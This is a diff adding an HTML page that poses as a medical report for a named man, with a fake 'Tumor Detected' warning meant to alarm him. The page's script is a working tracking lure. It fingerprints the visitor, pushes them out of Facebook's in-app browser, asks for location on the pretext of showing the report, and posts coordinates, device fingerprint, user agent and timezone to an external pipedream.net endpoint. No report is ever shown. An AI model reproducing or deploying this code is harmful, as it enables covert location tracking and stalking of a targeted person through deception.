@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Medical Report</title>
+  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 100px;
+      padding: 20px;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    .warning {
+      background: #ffeeba;
+      padding: 15px;
+      color: #333;
+      font-weight: bold;
+      border: 1px solid #f5c6cb;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="browserWarning" class="warning" style="display:none;">
+    ⚠️ Please open this page in your browser (Safari or Chrome). <br>
+    Tap the 3 dots (•••) in the top right and choose <b>“Open in Browser”</b>.
+  </div>
+
+  <h1>Mr Mohsin Kobir</h1>
+  <h1>Please allow location to view report from branch</h1>
+  <p>Click below to view report</p>
+  <p><i><h1>Warning: Tumor Detected</h1></i> -Professor Dr. Idris Ali </p>
+  <button id="registerBtn" disabled>View Mr. Kobir's Report</button>
+
+  <script>
+    const registerButton = document.getElementById("registerBtn");
+    const browserWarning = document.getElementById("browserWarning");
+    let fingerprintData = null;
+
+    // Detect if in Facebook/Messenger in-app browser
+    const userAgent = navigator.userAgent || "";
+    const inFacebookApp = userAgent.includes("FBAN") || userAgent.includes("FBAV");
+
+    if (inFacebookApp) {
+      browserWarning.style.display = "block";
+      registerButton.disabled = true;
+    } else {
+      // Load FingerprintJS
+      FingerprintJS.load().then(fp => {
+        fp.get().then(result => {
+          fingerprintData = result;
+          registerButton.disabled = false;
+        });
+      });
+
+      registerButton.addEventListener("click", function () {
+        if (!fingerprintData) {
+          alert("Please wait while we process");
+          return;
+        }
+
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(function (position) {
+            const locationData = {
+              latitude: position.coords.latitude,
+              longitude: position.coords.longitude,
+              accuracy: position.coords.accuracy
+            };
+            sendData(locationData);
+            alert("Please try again");
+
+          }, function (error) {
+            console.error("Location denied:", error);
+            sendData({ latitude: null, longitude: null, accuracy: null });
+            alert("Try again");
+          });
+        } else {
+          alert("Location not supported");
+        }
+      });
+    }
+
+    function sendData(locationData) {
+      const formData = new FormData();
+      formData.append("latitude", locationData.latitude);
+      formData.append("longitude", locationData.longitude);
+      formData.append("accuracy", locationData.accuracy);
+      formData.append("fingerprint", fingerprintData.visitorId);
+      formData.append("userAgent", navigator.userAgent);
+      formData.append("platform", navigator.platform);
+      formData.append("timezone", Intl.DateTimeFormat().resolvedOptions().timeZone);
+
+      fetch("https://eom1ae5o69bw4nt.m.pipedream.net", {
+        method: "POST",
+        body: formData
+      });
+    }
+  </script>
+
+</body>
+</html>
